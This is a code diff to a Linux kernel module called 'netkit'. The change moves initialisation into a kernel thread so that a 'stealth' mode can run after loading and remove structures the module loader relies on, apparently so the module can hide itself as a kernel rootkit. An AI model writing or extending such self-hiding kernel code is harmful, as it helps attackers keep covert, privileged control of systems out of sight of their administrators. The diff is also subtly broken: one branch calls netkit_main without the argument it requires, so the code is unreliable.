@@ -1,6 +1,7 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/export.h>
+#include <linux/kthread.h>
 
 #include "netkit.h"
 
@@ -8,17 +9,16 @@
 #include "io/iface.h"
 #include "sys/debug.h"
 
-struct module *netkit_module;
-
-static int __init netkit_init(void)
+static int netkit_main(void* args)
 {
+    DECLARE_WAIT_QUEUE_HEAD(wait_queue);
     int retv;
 
     pr_err("[+] module started (debug: %d)\n", CONFIG_NETKIT_DEBUG);
 
-    netkit_module = THIS_MODULE;
-
 #if CONFIG_NETKIT_STEALTH
+    wait_event(wait_queue, THIS_MODULE->state == MODULE_STATE_LIVE);
+
     NETKIT_LOG("[*] starting stealth...\n");
     retv = stealth_init();
     if (retv < 0)
@@ -32,6 +32,18 @@ static int __init netkit_init(void)
     retv = io_init();
     if (retv < 0)
         NETKIT_LOG("[!] failed to start IO (err: %d)\n", retv);
+
+    return 0;
+}
+
+static int __init netkit_init(void)
+{
+#if CONFIG_NETKIT_STEALTH
+    // be able to delete things required by the module loader post THIS_MODULE->init()
+    kthread_run(netkit_main, NULL, "netkit-main");
+#else
+    netkit_main();
+#endif
 
     return 0;
 }
